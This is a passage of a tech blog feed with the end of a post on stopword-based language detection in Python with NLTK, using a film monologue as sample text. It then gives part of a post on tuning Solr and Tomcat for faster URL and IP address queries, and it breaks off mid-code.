</span></code></pre></td></tr></table></div></figure>


<p>First we tokenize using wordpunct_tokenize function and lowercase all splitted tokens, then we walk across nltk included languages and count how many unique stopwords are seen in analyzed text to put this in &#8220;language_ratios&#8221; dictionary.</p>

<p>Finally, we only have to get the &#8220;key&#8221; with biggest &#8220;value&#8221;:</p>

<figure class='code'><figcaption><span>get most rated language</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">most_rated_language</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">languages_ratios</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">languages_ratios</span><span class="o">.</span><span class="n">get</span><span class="p">)</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">most_rated_language</span>
</span><span class='line'><span class="s">&#39;english&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So yes, it seems this approach works fine with well written texts - those who respect grammatical rules - (and not so small ones) and is really easy to implement.</p>

<h2>Putting it all together</h2>

<p>If we put all the explained above into a script we have something like this:</p>

<figure class='code'><figcaption><span>langdetector.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="c">#coding:utf-8</span>
</span><span class='line'><span class="c"># Author: Alejandro Nolla - z0mbiehunt3r</span>
</span><span class='line'><span class="c"># Purpose: Example for detecting language using a stopwords based approach</span>
</span><span class='line'><span class="c"># Created: 15/05/13</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="kn">from</span> <span class="nn">nltk</span> <span class="kn">import</span> <span class="n">wordpunct_tokenize</span>
</span><span class='line'>    <span class="kn">from</span> <span class="nn">nltk.corpus</span> <span class="kn">import</span> <span class="n">stopwords</span>
</span><span class='line'><span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;[!] You need to install nltk (http://nltk.org/index.html)&#39;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c">#----------------------------------------------------------------------</span>
</span><span class='line'><span class="k">def</span> <span class="nf">_calculate_languages_ratios</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">    Calculate probability of given text to be written in several languages and</span>
</span><span class='line'><span class="sd">    return a dictionary that looks like {&#39;french&#39;: 2, &#39;spanish&#39;: 4, &#39;english&#39;: 0}</span>
</span><span class='line'><span class="sd">    </span>
</span><span class='line'><span class="sd">    @param text: Text whose language want to be detected</span>
</span><span class='line'><span class="sd">    @type text: str</span>
</span><span class='line'><span class="sd">    </span>
</span><span class='line'><span class="sd">    @return: Dictionary with languages and unique stopwords seen in analyzed text</span>
</span><span class='line'><span class="sd">    @rtype: dict</span>
</span><span class='line'><span class="sd">    &quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">languages_ratios</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">    nltk.wordpunct_tokenize() splits all punctuations into separate tokens</span>
</span><span class='line'><span class="sd">    </span>
</span><span class='line'><span class="sd">    &gt;&gt;&gt; wordpunct_tokenize(&quot;That&#39;s thirty minutes away. I&#39;ll be there in ten.&quot;)</span>
</span><span class='line'><span class="sd">    [&#39;That&#39;, &quot;&#39;&quot;, &#39;s&#39;, &#39;thirty&#39;, &#39;minutes&#39;, &#39;away&#39;, &#39;.&#39;, &#39;I&#39;, &quot;&#39;&quot;, &#39;ll&#39;, &#39;be&#39;, &#39;there&#39;, &#39;in&#39;, &#39;ten&#39;, &#39;.&#39;]</span>
</span><span class='line'><span class="sd">    &#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">tokens</span> <span class="o">=</span> <span class="n">wordpunct_tokenize</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span><span class='line'>    <span class="n">words</span> <span class="o">=</span> <span class="p">[</span><span class="n">word</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">tokens</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Compute per language included in nltk number of unique stopwords appearing in analyzed text</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">language</span> <span class="ow">in</span> <span class="n">stopwords</span><span class="o">.</span><span class="n">fileids</span><span class="p">():</span>
</span><span class='line'>        <span class="n">stopwords_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">stopwords</span><span class="o">.</span><span class="n">words</span><span class="p">(</span><span class="n">language</span><span class="p">))</span>
</span><span class='line'>        <span class="n">words_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">words</span><span class="p">)</span>
</span><span class='line'>        <span class="n">common_elements</span> <span class="o">=</span> <span class="n">words_set</span><span class="o">.</span><span class="n">intersection</span><span class="p">(</span><span class="n">stopwords_set</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">languages_ratios</span><span class="p">[</span><span class="n">language</span><span class="p">]</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">common_elements</span><span class="p">)</span> <span class="c"># language &quot;score&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">languages_ratios</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c">#----------------------------------------------------------------------</span>
</span><span class='line'><span class="k">def</span> <span class="nf">detect_language</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">    Calculate probability of given text to be written in several languages and</span>
</span><span class='line'><span class="sd">    return the highest scored.</span>
</span><span class='line'><span class="sd">    </span>
</span><span class='line'><span class="sd">    It uses a stopwords based approach, counting how many unique stopwords</span>
</span><span class='line'><span class="sd">    are seen in analyzed text.</span>
</span><span class='line'><span class="sd">    </span>
</span><span class='line'><span class="sd">    @param text: Text whose language want to be detected</span>
</span><span class='line'><span class="sd">    @type text: str</span>
</span><span class='line'><span class="sd">    </span>
</span><span class='line'><span class="sd">    @return: Most scored language guessed</span>
</span><span class='line'><span class="sd">    @rtype: str</span>
</span><span class='line'><span class="sd">    &quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">ratios</span> <span class="o">=</span> <span class="n">_calculate_languages_ratios</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">most_rated_language</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">ratios</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">ratios</span><span class="o">.</span><span class="n">get</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">most_rated_language</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">text</span> <span class="o">=</span> <span class="s">&#39;&#39;&#39;</span>
</span><span class='line'><span class="s">    There&#39;s a passage I got memorized. Ezekiel 25:17. &quot;The path of the righteous man is beset on all sides</span><span class="se">\</span>
</span><span class='line'><span class="s">    by the inequities of the selfish and the tyranny of evil men. Blessed is he who, in the name of charity</span><span class="se">\</span>
</span><span class='line'><span class="s">    and good will, shepherds the weak through the valley of the darkness, for he is truly his brother&#39;s keeper</span><span class="se">\</span>
</span><span class='line'><span class="s">    and the finder of lost children. And I will strike down upon thee with great vengeance and furious anger</span><span class="se">\</span>
</span><span class='line'><span class="s">    those who attempt to poison and destroy My brothers. And you will know I am the Lord when I lay My vengeance</span><span class="se">\</span>
</span><span class='line'><span class="s">    upon you.&quot; Now... I been sayin&#39; that shit for years. And if you ever heard it, that meant your ass. You&#39;d</span><span class="se">\</span>
</span><span class='line'><span class="s">    be dead right now. I never gave much thought to what it meant. I just thought it was a cold-blooded thing</span><span class="se">\</span>
</span><span class='line'><span class="s">    to say to a motherfucker before I popped a cap in his ass. But I saw some shit this mornin&#39; made me think</span><span class="se">\</span>
</span><span class='line'><span class="s">    twice. See, now I&#39;m thinking: maybe it means you&#39;re the evil man. And I&#39;m the righteous man. And Mr.</span><span class="se">\</span>
</span><span class='line'><span class="s">    9mm here... he&#39;s the shepherd protecting my righteous ass in the valley of darkness. Or it could mean</span><span class="se">\</span>
</span><span class='line'><span class="s">    you&#39;re the righteous man and I&#39;m the shepherd and it&#39;s the world that&#39;s evil and selfish. And I&#39;d like</span><span class="se">\</span>
</span><span class='line'><span class="s">    that. But that shit ain&#39;t the truth. The truth is you&#39;re the weak. And I&#39;m the tyranny of evil men.</span><span class="se">\</span>
</span><span class='line'><span class="s">    But I&#39;m tryin&#39;, Ringo. I&#39;m tryin&#39; real hard to be the shepherd.</span>
</span><span class='line'><span class="s">    &#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">language</span> <span class="o">=</span> <span class="n">detect_language</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="n">language</span>
</span></code></pre></td></tr></table></div></figure>


<p>There are others ways to &#8220;guess&#8221; language from a given text like N-Gram-Based text categorization so will see it in, probably, next post.</p>

<p>See you soon and, as always, hope you find it interesting and useful!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[solr: Improving queries performance]]></title>
    <link href="http://blog.alejandronolla.com/2013/04/29/solr-improving-queries-performance/"/>
    <updated>2013-04-29T20:29:00+02:00</updated>
    <id>http://blog.alejandronolla.com/2013/04/29/solr-improving-queries-performance</id>
    <content type="html"><![CDATA[<h2>Introduction</h2>

<p>These days i&#8217;m messing around with an application that index thousands of documents per day and perform hundreds of queries per hour, so query performance is crucial. The main aim is to provide detection of URLs and IP addresses (want to play a bit? take a look to <a href="http://blog.alejandronolla.com/2013/03/23/indexing-pdf-for-osint-and-pentesting/">a previous post</a>) but full-text searching capabilities is also desired althought less used, so i have given a try to improve performance and, specifically, query times, and here is my tests results.<!-- more --></p>

<p>Actually the core&#8217; schema.xml it&#8217;s something like this:</p>

<figure class='code'><figcaption><span>initial schema.xml file</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span class='line'><span class="nt">&lt;schema</span> <span class="na">name=</span><span class="s">&quot;example&quot;</span> <span class="na">version=</span><span class="s">&quot;1.5&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;fields&gt;</span>
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;id&quot;</span> <span class="na">type=</span><span class="s">&quot;uuid&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span> <span class="na">default=</span><span class="s">&quot;NEW&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;text&quot;</span> <span class="na">type=</span><span class="s">&quot;text_general&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;url&quot;</span> <span class="na">type=</span><span class="s">&quot;string&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span> <span class="na">required=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;hash&quot;</span> <span class="na">type=</span><span class="s">&quot;string&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">required=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/fields&gt;</span>
</span><span class='line'>  <span class="nt">&lt;uniqueKey&gt;</span>hash<span class="nt">&lt;/uniqueKey&gt;</span>
</span><span class='line'>  <span class="nt">&lt;types&gt;</span>
</span><span class='line'>    <span class="nt">&lt;fieldType</span> <span class="na">name=</span><span class="s">&quot;uuid&quot;</span> <span class="na">class=</span><span class="s">&quot;solr.UUIDField&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;fieldType</span> <span class="na">name=</span><span class="s">&quot;string&quot;</span> <span class="na">class=</span><span class="s">&quot;solr.StrField&quot;</span> <span class="na">sortMissingLast=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;fieldType</span> <span class="na">name=</span><span class="s">&quot;text_general&quot;</span> <span class="na">class=</span><span class="s">&quot;solr.TextField&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;analyzer</span> <span class="na">type=</span><span class="s">&quot;index&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        <span class="nt">&lt;tokenizer</span> <span class="na">class=</span><span class="s">&quot;solr.WhitespaceTokenizerFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>        <span class="nt">&lt;filter</span> <span class="na">class=</span><span class="s">&quot;solr.LowerCaseFilterFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;/analyzer&gt;</span>
</span><span class='line'>      <span class="nt">&lt;analyzer</span> <span class="na">type=</span><span class="s">&quot;query&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        <span class="nt">&lt;tokenizer</span> <span class="na">class=</span><span class="s">&quot;solr.WhitespaceTokenizerFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>        <span class="nt">&lt;filter</span> <span class="na">class=</span><span class="s">&quot;solr.LowerCaseFilterFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;/analyzer&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/fieldType&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/types&gt;</span>
</span><span class='line'><span class="nt">&lt;/schema&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>
As can be seen, it only indexes and store given text, url and hash (used for avoid dupes), converting case to lower and tokenizing by whitespaces. This means that a document with content &#8220;SPAM Visit blog.alejandronolla.com&#8221; will be tokenized to &#8220;[&#8216;spam&#8217;, &#8216;visit&#8217;, &#8216;blog.alejandronolla.com&#8217;]&#8221; so, if we want to search documents mentioning any subdomain of alejandronolla.com we would have to search something like &#8220;text:*alejandronolla.com&#8221; (it could vary based on decisions like looking for domains similar to alejandronolla.com.PHISINGSITE.com or just whatever.alejandronolla.com).</p>

<p>This kind of queries, using leading/trailing wildcars, are really expensive for solr because it can&#8217;t use just indexed tokens but perform some walking up to &#8220;n&#8221; characters more.</p>

<h2>Avoiding solr heap space problems</h2>

<p>When dealing with a lot of documents concurrently probably you&#8217;re going to face heap space problems sooner or later so i strongly recommend to increase RAM asigned to java virtual machine.</p>

<p>In this case i use Tomcat to serve solr, so i needed to modify JAVA_OPTS in catalina.sh (stored at <em>&#8220;/usr/share/tomcat7/bin/catalina.sh&#8221;</em>):</p>

<figure class='code'><figcaption><span>Setting up values for RAM usage</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="k">if</span> <span class="o">[</span> -z <span class="s2">&quot;$LOGGING_MANAGER&quot;</span> <span class="o">]</span>; <span class="k">then</span>
</span><span class='line'><span class="k">  </span><span class="nv">JAVA_OPTS</span><span class="o">=</span><span class="s2">&quot;$JAVA_OPTS -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Xms2048m -Xmx16384m&quot;</span>
</span><span class='line'><span class="k">else</span>
</span><span class='line'><span class="k">  </span><span class="nv">JAVA_OPTS</span><span class="o">=</span><span class="s2">&quot;$JAVA_OPTS $LOGGING_MANAGER -Xms2048m -Xmx16384m&quot;</span>
</span><span class='line'><span class="k">fi</span>
</span></code></pre></td></tr></table></div></figure>


<p>Adding <em>&#8220;-Xms2048m -Xmx16384m&#8221;</em> we specify tomcat to preallocate at least 2048MB and maximum of 16384MB for heap space for avoiding heap space problems (in my tests i almost used about 2GB indexing about 300k documents in two differents cores, so there is plenty of RAM left yet):<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/04/jvm.png"></p>

<h2>Handling thousand of concurrent connections with Tomcat</h2>

<p>We have to set some configuration at <em>&#8220;/etc/tomcat6/server.xml&#8221;</em>:</p>

<figure class='code'><figcaption><span>Tomcat configuration</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;Connector</span> <span class="na">port=</span><span class="s">&quot;8080&quot;</span> <span class="na">protocol=</span><span class="s">&quot;HTTP/1.1&quot;</span>
</span><span class='line'>           <span class="na">connectionTimeout=</span><span class="s">&quot;20000&quot;</span>
</span><span class='line'>           <span class="na">URIEncoding=</span><span class="s">&quot;UTF-8&quot;</span>
</span><span class='line'>           <span class="na">redirectPort=</span><span class="s">&quot;8443&quot;</span>
</span><span class='line'>           <span class="na">maxThreads=</span><span class="s">&quot;10000&quot;</span><span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>
I have set up maxThreads to 10000 because i want to index documents through API REST with a python script using async HTTP requests to avoid loosing too much time indexing data (and i&#8217;m almost sure bottleneck here is python and not solr).</p>

<h2>First improvement: Separate the grain from the chaff</h2>

<p>As previously said, most of the queries looks for domains and IP addresses through full document&#8217;s content, causing really heavy queries (and performance problems), so the first action i took was to create a new fields just with &#8220;domains look&#8217;s like&#8221; string and IP addresses to tie down queries just to potentially valuable info.</p>

<p>To extract domains, emails and similar strings solr already have a really powerful tokenizer called <a href="http://wiki.apache.org/solr/AnalyzersTokenizersTokenFilters#solr.UAX29URLEmailTokenizerFactory">solr.UAX29URLEmailTokenizerFactory</a>, so we only need to tell solr to index given document text using this tokenizer in another field.</p>

<p>To specify solr which and where field we want to copy we have to create two new fields and specify source and destination fields:</p>

<figure class='code'><figcaption><span>New copied fields at schema.xml</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'>  <span class="nt">&lt;fields&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;ip_addresses&quot;</span> <span class="na">type=</span><span class="s">&quot;ip_addresses&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;false&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;text_UAX29&quot;</span> <span class="na">type=</span><span class="s">&quot;text_UAX29&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;false&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/fields&gt;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nt">&lt;copyField</span> <span class="na">source=</span><span class="s">&quot;text&quot;</span> <span class="na">dest=</span><span class="s">&quot;text_UAX29&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>  <span class="nt">&lt;copyField</span> <span class="na">source=</span><span class="s">&quot;text&quot;</span> <span class="na">dest=</span><span class="s">&quot;ip_addresses&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nt">&lt;types&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>    <span class="nt">&lt;fieldType</span> <span class="na">name=</span><span class="s">&quot;text_UAX29&quot;</span> <span class="na">class=</span><span class="s">&quot;solr.TextField&quot;</span> <span class="na">positionIncrementGap=</span><span class="s">&quot;100&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;analyzer</span> <span class="na">type=</span><span class="s">&quot;index&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        <span class="nt">&lt;tokenizer</span> <span class="na">class=</span><span class="s">&quot;solr.UAX29URLEmailTokenizerFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>        <span class="nt">&lt;filter</span> <span class="na">class=</span><span class="s">&quot;solr.LowerCaseFilterFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;/analyzer&gt;</span>
</span><span class='line'>      <span class="nt">&lt;analyzer</span> <span class="na">type=</span><span class="s">&quot;query&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        <span class="nt">&lt;tokenizer</span> <span class="na">class=</span><span class="s">&quot;solr.UAX29URLEmailTokenizerFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>        <span class="nt">&lt;filter</span> <span class="na">class=</span><span class="s">&quot;solr.LowerCaseFilterFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;/analyzer&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/fieldType&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>    <span class="nt">&lt;/types&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>
We are going to use these fields only for searching, so we specify to index but not store (we already have full document content in &#8220;text&#8221; field) It&#8217;s important to have in mind the fact that solr copy fields <a href="http://wiki.apache.org/solr/SchemaXml#Copy_Fields">before</a> doing any kind of processing to document.</p>

<p>If you have noticed it, we specified an undeclared field type called &#8220;ip_addresses&#8221;, and we are going to use <a href="http://wiki.apache.org/solr/AnalyzersTokenizersTokenFilters#solr.PatternTokenizerFactory">solr.PatternTokenizerFactory</a> to make a regex for extracting IP addresses and CIDR network ranges (like 192.168.1.0/16)</p>

<figure class='code'><figcaption><span>Extracting IP addresses with regex</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'>  <span class="nt">&lt;types&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>    <span class="nt">&lt;fieldType</span> <span class="na">name=</span><span class="s">&quot;ip_addresses&quot;</span> <span class="na">class=</span><span class="s">&quot;solr.TextField&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;analyzer&gt;</span>
</span><span class='line'>        <span class="nt">&lt;tokenizer</span> <span class="na">class=</span><span class="s">&quot;solr.PatternTokenizerFactory&quot;</span> <span class="na">pattern=</span><span class="s">&quot;(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/?\d{1,2}?)&quot;</span> <span class="na">group=</span><span class="s">&quot;1&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;/analyzer&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/fieldType&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>    <span class="nt">&lt;/types&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>
It&#8217;s a really simple regex and should be improved before using it in a production environment for example, to extract only certain IP addresses (not RFC1918, not bogus, quad-octet validated, and so on) or even implement your own tokenizer extending <a href="http://wiki.apache.org/solr/AnalyzersTokenizersTokenFilters">existing ones</a>, but will fit ok for our tests.</p>

<p>Now we can change queries from &#8220;text:*alejandronolla.com&#8221; to &#8220;text_UAX29:*alejandronolla.com&#8221; to walk much smaller subset of data, improving queries in a huge way.</p>

<h2>UPDATE:</h2>

<p>I totally forgot to specify to filter out all tokens that are not email or url after tokenizing with UAX29 specification to just store emails and urls. To do this we need to set a <a href="http://lucene.apache.org/core/4_0_0/analyzers-common/org/apache/lucene/analysis/core/TypeTokenFilterFactory.html">token filter</a> at fieldType &#8220;text_UAX29&#8221;:</p>

<figure class='code'><figcaption><span>Leaving only URL and emails</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
